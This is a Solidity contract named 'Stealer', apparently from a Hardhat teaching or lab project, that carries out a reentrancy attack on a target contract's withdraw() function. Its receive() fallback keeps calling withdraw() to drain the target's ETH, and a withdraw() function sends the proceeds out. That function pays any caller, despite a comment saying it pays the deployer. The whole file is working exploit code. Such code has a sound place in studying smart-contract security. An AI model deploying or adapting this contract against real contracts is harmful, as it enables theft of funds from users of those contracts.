// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

// Import this file to use console.log
import "hardhat/console.sol";

// need to know the function name of the vulnerable contract
interface IWithdraw{
	function withdraw() external;
}

contract Stealer {
	
	address private _vulnerableContract;

	constructor(address contractAddress) {
		_vulnerableContract = contractAddress;
    }

	receive() external payable {
		console.log(
			"[Stealer] receive: Stealer balance: %s",
			address(this).balance
		);
		// this contract receives funds to send it to lock and increase its balance in the lock
		if(msg.sender == _vulnerableContract) {
			// lock still have eth
			if (address(_vulnerableContract).balance > minWithdrawAmount) {
				// gas needed for the transaction to succeed
				if(gasleft() > 100_000) {
					// request withdraw funds again
					IWithdraw vulnerableContract = IWithdraw(address(_vulnerableContract));
					vulnerableContract.withdraw();
				}
			}
		}
	}

	function stealEth() external {
		console.log("[Stealer] initial balance: %s", address(this).balance);
		IWithdraw vulnerableContract = IWithdraw(address(_vulnerableContract));
		vulnerableContract.withdraw();
	}

	/**
	* deposit to lock and increase funds (in lock)
	*/
	function sendEth(address payable to, uint amount) external {
		(bool success, ) = to.call{value: amount}("");
		require(success);
	}

	/**
	* send funds to contract deployer
	*/
	function withdraw() external {
		address payable sender = payable(msg.sender);
		(bool success, ) = sender.call{value: address(this).balance}("");
		require(success, "could not send eth");
	}

	uint public minWithdrawAmount;
}
